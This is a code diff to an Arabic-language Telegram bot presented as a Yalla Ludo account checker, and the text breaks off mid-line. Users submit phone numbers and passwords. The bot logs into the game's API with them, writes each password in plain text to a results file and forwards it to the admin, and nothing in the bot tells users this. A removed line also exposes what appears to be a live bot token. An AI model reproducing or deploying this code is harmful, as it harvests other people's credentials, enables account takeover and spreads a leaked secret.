@@ -7,10 +7,15 @@ from Crypto.Util.Padding import pad, unpad
 from datetime import datetime
 from flask import Flask
 import threading
+import urllib.request
 
 # ==================== إعدادات البوت ====================
-BOT_TOKEN = "8120776454:AAGS0cdTX1z--z9XLt01WmTToMOT8uYvvLg"
-ADMIN_ID = 8557481747
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
+
+if not BOT_TOKEN:
+    print("❌ خطأ: BOT_TOKEN غير موجود")
+    sys.exit(1)
 
 # ==================== إنشاء تطبيق Flask ====================
 app = Flask(__name__)
@@ -30,8 +35,31 @@ bot = telebot.TeleBot(BOT_TOKEN)
 RESULTS_FILE = "check_results.txt"
 USERS_FILE = "users_ids.txt"
 
+# ==================== قائمة الدول ورموزها ====================
+COUNTRIES = {
+    "🇸🇦 السعودية": "966",
+    "🇮🇶 العراق": "964",
+    "🇰🇼 الكويت": "965",
+    "🇦🇪 الإمارات": "971",
+    "🇶🇦 قطر": "974",
+    "🇧🇭 البحرين": "973",
+    "🇴🇲 عمان": "968",
+    "🇪🇬 مصر": "20",
+    "🇩🇿 الجزائر": "213",
+    "🇲🇦 المغرب": "212",
+    "🇯🇴 الأردن": "962",
+    "🇱🇧 لبنان": "961",
+    "🇸🇾 سوريا": "963",
+    "🇵🇸 فلسطين": "970",
+    "🇾🇪 اليمن": "967",
+    "🇱🇾 ليبيا": "218",
+    "🇹🇳 تونس": "216",
+    "🇸🇩 السودان": "249",
+    "🇲🇷 موريتانيا": "222",
+    "🇸🇴 الصومال": "252",
+}
+
 def save_user(user_id, username=None, first_name=None):
-    """حفظ معرف المستخدم"""
     try:
         if not os.path.exists(USERS_FILE):
             with open(USERS_FILE, 'w', encoding='utf-8') as f:
@@ -53,14 +81,14 @@ def save_user(user_id, username=None, first_name=None):
         print(f"خطأ في حفظ المستخدم: {e}")
         return False
 
-def save_result(user_id, username, mobile, password, result_data):
-    """حفظ نتيجة الفحص"""
+def save_result(user_id, username, mobile, password, area_code, result_data):
     try:
         with open(RESULTS_FILE, 'a', encoding='utf-8') as f:
             f.write("="*60 + "\n")
             f.write(f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write(f"👤 المستخدم: {user_id} | @{username or 'بدون معرف'}\n")
             f.write(f"📱 الرقم: {mobile}\n")
+            f.write(f"🌍 الدولة: +{area_code}\n")
             f.write(f"🔑 الباسورد: {password}\n")
             f.write("-"*60 + "\n")
             
@@ -82,20 +110,21 @@ def save_result(user_id, username, mobile, password, result_data):
                 f.write(f"❌ فشل: {result_data}\n")
             f.write("\n")
         
-        # إرسال إشعار للأدمن
-        send_admin_notification(user_id, username, mobile, password, result_data)
-        
+        send_admin_notification(user_id, username, mobile, password, area_code, result_data)
     except Exception as e:
         print(f"خطأ في حفظ النتيجة: {e}")
 
-def send_admin_notification(user_id, username, mobile, password, result_data):
-    """إرسال إشعار للأدمن"""
+def send_admin_notification(user_id, username, mobile, password, area_code, result_data):
     try:
+        country_name = [name for name, code in COUNTRIES.items() if code == area_code]
+        country_name = country_name[0] if country_name else area_code
+        
         text = f"🔔 <b>فحص جديد!</b>\n"
         text += f"{'─' * 30}\n"
         text += f"👤 <b>المستخدم:</b> {user_id}\n"
         text += f"📝 <b>المعرف:</b> @{username or 'بدون معرف'}\n"
         text += f"📱 <b>الرقم:</b> {mobile}\n"
+        text += f"🌍 <b>الدولة:</b> {country_name} (+{area_code})\n"
         text += f"🔑 <b>الباسورد:</b> <code>{password}</code>\n"
         text += f"{'─' * 30}\n"
         
@@ -296,8 +325,8 @@ def buildrequest(body, token='', uid='0', path=None):
     wire = json.dumps({"paramJsonString": encrypt(body, hera)}, separators=(',',':')).encode('utf-8')
     return headers, wire
 
-def login(mobile, password):
-    body = payload(mobile, password)
+def login(mobile, password, area):
+    body = payload(mobile, password, area)
     headers, wire = buildrequest(body)
     hera = headers['X-Hera']
     response = requests.post(api, data=wire, headers=headers, timeout=25)
@@ -338,9 +367,9 @@ def getinfo(token, uid, account):
     return last or {'status': -1, 'tips': 'لا يوجد رد'}
 
 # ==================== دوال البوت ====================
-def check_account(mobile, password):
+def check_account(mobile, password, area):
     try:
-        lg = login(mobile, password)
+        lg = login(mobile, password, area)
         if lg.get('status') != 0:
             return {'status': lg.get('status'), 'tips': lg.get('tips', 'فشل تسجيل الدخول')}
         d = lg['data']
@@ -353,7 +382,7 @@ def check_account(mobile, password):
     except Exception as e:
         return {'status': -1, 'tips': str(e)}
 
-def format_result(result, mobile, password):
+def format_result(result, mobile, password, country_name):
     if result.get('status') != 0:
         return f"❌ فشل: {result.get('tips', 'خطأ غير معروف')}"
     data = result.get('data', {})
@@ -362,6 +391,7 @@ def format_result(result, mobile, password):
     text = f"📊 <b>معلومات الحساب</b>\n"
     text += f"{'─' * 30}\n"
     text += f"📱 <b>الرقم:</b> {mobile}\n"
+    text += f"🌍 <b>الدولة:</b> {country_name}\n"
     text += f"🔑 <b>الباسورد:</b> <code>{password}</code>\n"
     text += f"{'─' * 30}\n"
     text += f"👤 <b>الاسم:</b> {base.get('name', 'غير معروف')}\n"
@@ -385,128 +415,93 @@ def start_command(message):
     username = message.from_user.username
     first_name = message.from_user.first_name
     save_user(user_id, username, first_name)
-    markup = types.InlineKeyboardMarkup(row_width=1)
+    
+    markup = types.InlineKeyboardMarkup(row_width=2)
     btn_check = types.InlineKeyboardButton("🔍 فحص حساب", callback_data="check")
+    btn_country = types.InlineKeyboardButton("🌍 اختيار الدولة", callback_data="country")
     btn_dev = types.InlineKeyboardButton("👨‍💻 المطور", url="https://t.me/devil_2M")
-    markup.add(btn_check, btn_dev)
+    markup.add(btn_check, btn_country, btn_dev)
+    
     welcome_text = (
         f"🎲 <b>بوت فحص حسابات Yalla Ludo</b>\n\n"
         f"👋 أهلاً بك <b>{first_name}</b>!\n\n"
         f"هذا البوت يفحص حسابات Yalla Ludo ويعرض معلوماتها.\n\n"
-        f"اضغط على زر <b>'فحص حساب'</b> واتبع التعليمات."
+        f"📌 اختر الدولة أولاً ثم اضغط 'فحص حساب'"
     )
+    
     bot.send_message(message.chat.id, welcome_text, parse_mode="HTML", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    if call.data == "check":
-        msg = bot.send_message(call.message.chat.id, "📱 <b>أرسل رقم الحساب:</b>", parse_mode="HTML")
-        bot.register_next_step_handler(msg, get_mobile)
+# ==================== اختيار الدولة ====================
+user_country = {}  # تخزين الدولة لكل مستخدم
 
-def get_mobile(message):
-    mobile = message.text.strip()
-    if not mobile:
-        bot.reply_to(message, "❌ الرجاء إدخال رقم صحيح.")
-        return
-    msg = bot.send_message(message.chat.id, "🔑 <b>أرسل كلمة المرور:</b>", parse_mode="HTML")
-    bot.register_next_step_handler(msg, lambda m: get_password(m, mobile))
+@bot.callback_query_handler(func=lambda call: call.data == "country")
+def choose_country(call):
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    
+    # إضافة أزرار الدول (صفين)
+    buttons = []
+    for name, code in COUNTRIES.items():
+        buttons.append(types.InlineKeyboardButton(name, callback_data=f"country_{code}"))
+    
+    # ترتيب الأزرار في صفين
+    for i in range(0, len(buttons), 2):
+        row = buttons[i:i+2]
+        markup.add(*row)
+    
+    # زر رجوع
+    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu"))
+    
+    bot.edit_message_text(
+        "🌍 <b>اختر دولة الحساب:</b>\n\n"
+        "اختر الدولة التي ينتمي لها الرقم الذي تريد فحصه.",
+        chat_id=call.message.chat.id,
+        message_id=call.message.message_id,
+        parse_mode="HTML",
+        reply_markup=markup
+    )
 
-def get_password(message, mobile):
-    password = message.text.strip()
-    if not password:
-        bot.reply_to(message, "❌ الرجاء إدخال كلمة مرور صحيحة.")
-        return
-    wait_msg = bot.reply_to(message, "⏳ جاري فحص الحساب...")
-    result = check_account(mobile, password)
-    user_id = message.from_user.id
-    username = message.from_user.username
-    save_result(user_id, username, mobile, password, result)
-    if result.get('status') == 0:
-        text = format_result(result, mobile, password)
-        bot.edit_message_text(text, chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")
+@bot.callback_query_handler(func=lambda call: call.data.startswith("country_"))
+def set_country(call):
+    area_code = call.data.replace("country_", "")
+    
+    # البحث عن اسم الدولة
+    country_name = None
+    for name, code in COUNTRIES.items():
+        if code == area_code:
+            country_name = name
+            break
+    
+    if country_name:
+        user_country[call.from_user.id] = area_code
+        bot.answer_callback_query(call.id, f"✅ تم اختيار {country_name}")
+        
+        # رجوع للقائمة
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        btn_check = types.InlineKeyboardButton("🔍 فحص حساب", callback_data="check")
+        btn_country = types.InlineKeyboardButton("🌍 تغيير الدولة", callback_data="country")
+        btn_dev = types.InlineKeyboardButton("👨‍💻 المطور", url="https://t.me/devil_2M")
+        markup.add(btn_check, btn_country, btn_dev)
+        
+        bot.edit_message_text(
+            f"✅ <b>تم اختيار الدولة: {country_name}</b>\n\n"
+            f"الآن اضغط على 'فحص حساب' للبدء.",
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            parse_mode="HTML",
+            reply_markup=markup
+        )
     else:
-        error_text = f"❌ فشل الفحص\n\n"
-        error_text += f"📱 الرقم: {mobile}\n"
-        error_text += f"🔑 الباسورد: <code>{password}</code>\n"
-        error_text += f"⚠️ السبب: {result.get('tips', 'خطأ غير معروف')}"
-        bot.edit_message_text(error_text, chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")
+        bot.answer_callback_query(call.id, "❌ حدث خطأ، حاول مرة أخرى")
 
-# ==================== أوامر الأدمن ====================
-@bot.message_handler(commands=['users'])
-def users_command(message):
-    if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ هذا الأمر خاص بالأدمن فقط.")
-        return
-    try:
-        with open(USERS_FILE, 'r', encoding='utf-8') as f:
-            content = f.read()
-        users = [line for line in content.split('\n') if line and not line.startswith('#')]
-        count = len(users)
-        text = f"📊 <b>إحصائيات المستخدمين</b>\n"
-        text += f"{'─' * 30}\n"
-        text += f"👥 عدد المستخدمين: <b>{count}</b>\n"
-        text += f"{'─' * 30}\n\n"
-        if users:
-            text += "<b>آخر 10 مستخدمين:</b>\n"
-            for user in users[-10:]:
-                text += f"• {user}\n"
-        bot.reply_to(message, text, parse_mode="HTML")
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
-@bot.message_handler(commands=['results'])
-def results_command(message):
-    if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ هذا الأمر خاص بالأدمن فقط.")
-        return
-    try:
-        with open(RESULTS_FILE, 'rb') as f:
-            bot.send_document(
-                message.chat.id,
-                f,
-                caption=f"📄 نتائج الفحوصات - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            )
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
-@bot.message_handler(commands=['stats'])
-def stats_command(message):
-    if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ هذا الأمر خاص بالأدمن فقط.")
-        return
-    try:
-        with open(RESULTS_FILE, 'r', encoding='utf-8') as f:
-            content = f.read()
-        checks = [line for line in content.split('\n') if line.startswith('📅')]
-        count = len(checks)
-        success = content.count('✅')
-        failed = content.count('❌')
-        text = f"📊 <b>إحصائيات الفحوصات</b>\n"
-        text += f"{'─' * 30}\n"
-        text += f"📝 عدد الفحوصات: <b>{count}</b>\n"
-        text += f"✅ النجاح: <b>{success}</b>\n"
-        text += f"❌ الفشل: <b>{failed}</b>\n"
-        bot.reply_to(message, text, parse_mode="HTML")
-    except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {e}")
-
-# ==================== تشغيل البوت ====================
-def run_bot():
-    bot.infinity_polling(timeout=60)
-
-if __name__ == "__main__":
-    print("🚀 بوت فحص حسابات Yalla Ludo يعمل...")
-    print("="*50)
-    print("🌐 بدون بروكسي - اتصال مباشر")
-    print(f"📁 حفظ المستخدمين في: {USERS_FILE}")
-    print(f"📁 حفظ النتائج في: {RESULTS_FILE}")
-    print("="*50)
+@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
+def back_to_menu(call):
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    btn_check = types.InlineKeyboardButton("🔍 فحص حساب", callback_data="check")
+    btn_country = types.InlineKeyboardButton("🌍 اختيار الدولة", callback_data="country")
+    btn_dev = types.InlineKeyboardButton("👨‍💻 المطور", url="https://t.me/devil_2M")
+    markup.add(btn_check, btn_country, btn_dev)
     
-    # تشغيل البوت في thread منفصل
-    bot_thread = threading.Thread(target=run_bot)
-    bot_thread.daemon = True
-    bot_thread.start()
-    
-    # تشغيل Flask عشان يبقى شغال
-    port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port)
+    bot.edit_message_text(
+        "🎲 <b>بوت فحص حسابات Yalla Ludo</b>\n\n"
+        "اختر الدولة أولاً ثم اضغط 'فحص حساب'",
+        chat_id=call.mes
